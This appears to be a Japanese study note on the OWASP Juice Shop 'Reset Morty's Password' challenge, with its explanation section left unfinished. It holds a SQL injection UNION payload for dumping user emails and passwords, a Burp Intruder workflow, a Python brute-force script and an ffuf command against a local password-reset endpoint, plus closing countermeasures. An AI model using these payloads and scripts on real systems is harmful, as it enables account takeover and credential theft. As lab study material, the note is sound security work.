# Reset Morty's Password ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** ブルートフォース
**目標:** Morty のセキュリティ質問をブルートフォースで突破

---

## 思考プロセス

**ステップ1: ターゲット情報**
```
「Morty = Rick and Morty のキャラクター」
    ↓
「アニメの設定から答えを推測できる？」
    ↓
「セキュリティ質問の内容を確認」
    ↓
「答えを辞書攻撃でブルートフォース」
```

**ステップ2: セキュリティ質問の種類**
```
「よくある質問:」
    - ペットの名前
    - 母親の旧姓
    - 出身地
    - 好きな映画
    - 親友の名前
```

**ステップ3: Rick and Morty からのヒント**
```
「Morty Smith の情報:」
    - 祖父: Rick Sanchez
    - 姉: Summer Smith
    - 両親: Jerry & Beth Smith
    - 学校の親友: ?
    - ペット: Snuffles (後に Snowball)
```

## ユーザー情報の取得

```javascript
// SQLi でユーザー情報を取得
fetch("/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users WHERE email LIKE '%morty%'--")
  .then(r => r.json())
  .then(console.log);
```

## ブルートフォース手順

### 1. パスワードリセットフローを確認

```
1. /#/forgot-password にアクセス
2. morty@juice-sh.op を入力
3. セキュリティ質問が表示される
4. 答えを入力 → 新パスワードを設定
```

### 2. Burp Suite でリクエストを傍受

```http
POST /rest/user/reset-password HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "morty@juice-sh.op",
  "answer": "test",
  "new": "newpassword123",
  "repeat": "newpassword123"
}
```

### 3. Intruder でブルートフォース

```
1. Proxy → HTTP History でリクエストを選択
2. 右クリック → Send to Intruder
3. Positions タブで "answer" の値を選択 → Add §
4. Payloads タブで辞書ファイルを設定
5. Start Attack
6. 成功: Status 200, Length が異なる
```

## 辞書ファイル

```bash
# SecLists からダウンロード
git clone https://github.com/danielmiessler/SecLists

# おすすめの辞書
/SecLists/Passwords/Common-Credentials/best1050.txt
/SecLists/Passwords/Common-Credentials/10k-most-common.txt
/SecLists/Usernames/Names/names.txt
```

## Rick and Morty カスタム辞書

```
Rick
Morty
Summer
Beth
Jerry
Sanchez
Smith
Snuffles
Snowball
Plumbus
Meeseeks
Pickle
Wubba Lubba Dub Dub
Bird Person
Squanchy
Unity
Evil Morty
Citadel
Portal Gun
Szechuan Sauce
```

## Python スクリプト

```python
import requests

url = "http://localhost:3000/rest/user/reset-password"
email = "morty@juice-sh.op"

# カスタム辞書
wordlist = [
    "Rick", "Morty", "Summer", "Beth", "Jerry",
    "Snuffles", "Snowball", "Plumbus", "Meeseeks",
    # ... 追加
]

for word in wordlist:
    data = {
        "email": email,
        "answer": word,
        "new": "hacked123",
        "repeat": "hacked123"
    }
    r = requests.post(url, json=data)
    if r.status_code == 200:
        print(f"[+] Found! Answer: {word}")
        break
    else:
        print(f"[-] {word}: {r.status_code}")
```

## ffuf を使う方法

```bash
# ffuf でブルートフォース
ffuf -u http://localhost:3000/rest/user/reset-password \
     -X POST \
     -H "Content-Type: application/json" \
     -d '{"email":"morty@juice-sh.op","answer":"FUZZ","new":"hacked","repeat":"hacked"}' \
     -w /path/to/wordlist.txt \
     -fc 401
```

## 検証ポイント

- [ ] morty@juice-sh.op のセキュリティ質問を確認
- [ ] 辞書ファイルを準備
- [ ] ブルートフォース実行
- [ ] 正解を発見してパスワードリセット

## 対策

- アカウントロックアウト（n回失敗でロック）
- レート制限
- CAPTCHA
- 強力なセキュリティ質問（個人情報に基づかない）

## 関連チャレンジ

- [Bjoern's Favorite Pet](bjoerns-favorite-pet.md) - OSINT
- [Reset Jim's Password](reset-jims-password.md) - セキュリティ質問
- [CAPTCHA Bypass](captcha-bypass.md) - 自動化

## 解説

[未着手]
